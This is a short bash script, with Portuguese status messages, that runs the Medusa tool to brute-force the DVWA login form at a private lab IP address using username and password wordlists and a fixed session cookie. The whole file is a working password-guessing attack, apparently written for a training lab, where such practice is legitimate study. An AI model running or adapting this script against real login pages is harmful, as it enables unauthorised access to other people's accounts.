#!/bin/bash

TARGET="192.168.56.102"
USERS="../wordlists/users.txt"
PASSWORDS="../wordlists/passwords.txt"

COOKIE="PHPSESSID=3aac3d48da73200edfefc90cfe84abbf;security=low"

echo "Iniciando ataque com Medusa contra $TARGET..."

medusa -h $TARGET -U $USERS -P $PASSWORDS -M web-form \
-m "FORM:/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed:H=Cookie:$COOKIE" \
-t 4 -v 4 -f

echo "Ataque finalizado."